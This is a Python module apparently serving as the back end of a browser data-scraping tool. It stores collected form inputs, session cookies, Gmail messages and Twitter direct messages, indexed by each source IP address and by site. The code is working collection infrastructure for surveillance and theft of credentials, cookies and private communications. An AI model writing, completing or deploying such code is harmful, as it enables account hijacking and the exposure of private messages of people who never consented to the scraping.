from enum import Enum
import json
from typing import Any, Dict, List, Tuple, TypedDict
from urllib.parse import urlparse
from dateutil import parser

class ScrapeTypeEnum:
    INPUTS = "inputs"
    COOKIES = "cookies"
    GMAIL = "gmail"
    TWITTER = "twitter"

class ScrapeRequestDataType(TypedDict):
    href: str
    type: ScrapeTypeEnum
    time: int
    data: List[Dict[Any, Any]]


class ElementType(TypedDict):
    tag: str
    attributes: List[Tuple[str, str]]
    value: str

class CookieType(TypedDict):
    value: str
    last_updated: int

class DataCollectionType(TypedDict):
    inputs: List[Tuple[int, str, List[ElementType]]]
    cookies: Dict[str, CookieType]
    href: List[Tuple[int, str]]

def newDataCollectionType() -> DataCollectionType:
    return DataCollectionType(inputs=[], cookies={}, href=[])

StorageDataType = Dict[str, Dict[str, Dict[str, DataCollectionType]]]

class Storage:
    def __init__(self) -> None:
        self.__data: StorageDataType = {}
        self.load()

    def to_json(self) -> StorageDataType:
        return self.__data

    def load(self) -> None:
        # left out intentionally, can just use Unpickler to load saved data
        pass

    def save(self) -> None:
        # left out intentionally, simply use to_json inside Pickler
        # with open("storagefile.json", "w") as f:
        #     json.dump(self.to_json(), f)
        pass

    def store(self, ip: str, data: ScrapeRequestDataType) -> None:
        # store a request data into the storage
        if ip not in self.__data:
            self.__data[ip] = {}
        
        # create a new entry for this host and path
        url = urlparse(data["href"])
        if url.netloc not in self.__data[ip]:
            self.__data[ip][url.netloc] = {}
        if url.path not in self.__data[ip][url.netloc]:
            self.__data[ip][url.netloc][url.path] = newDataCollectionType()

        # check the type
        if data["type"] == ScrapeTypeEnum.INPUTS:
            for element in data["data"]:
                self.__data[ip][url.netloc][url.path]["inputs"].append((
                    data["time"],
                    data["href"],
                    element,
                ))

        elif data["type"] == ScrapeTypeEnum.COOKIES:
            for cookie in data["data"][0].split(";"):
                # clean the cookie and update its value
                key, value = cookie.lstrip(" ").split("=", 1)
                self.__data[ip][url.netloc][url.path]["cookies"][key] = {
                    "value": value,
                    "last_updated": data["time"],
                }
            self.__data[ip][url.netloc][url.path]["href"].append((
                data["time"],
                data["href"],
            ))

        elif data["type"] == ScrapeTypeEnum.GMAIL:
            # special scrape, store directly on the ip
            if "gmail" not in self.__data[ip]:
                self.__data[ip]["gmail"] = {}
            
            # go through each piece of data given and add update its store
            for entry in data["data"]:
                id = entry["id"]
                if id not in self.__data[ip]["gmail"]:
                    self.__data[ip]["gmail"][id] = {}

                self.__data[ip]["gmail"][id].update(entry)

        elif data["type"] == ScrapeTypeEnum.TWITTER:
            # special scrape for twitter messages, add directly on ip
            if "twitter" not in self.__data[ip]:
                self.__data[ip]["twitter"] = {}

            convoID = data["href"].split("/")[-1]
            if convoID not in self.__data[ip]["twitter"]:
                self.__data[ip]["twitter"][convoID] = {}
            
            # go through each piece of data given and add update its store
            for entry in data["data"]:
                print(entry)
                # try convert timestamp to unix time
                timestamp = entry["timestamp"]
                try:
                    timestamp = int(parser.parse(timestamp).timestamp())
                except:
                    # for instances of "yesterday", and other unparseable timestamps
                    pass

                # by using something hashable as index, we can try get a pseudo id since twitter doesn't give one
                id = hash(str(timestamp) + entry["sender"] + entry["content"])
                if id not in self.__data[ip]["twitter"][convoID]:
                    self.__data[ip]["twitter"][convoID][id] = {}
                
                # update the data
                self.__data[ip]["twitter"][convoID][id].update(entry)


        self.save()


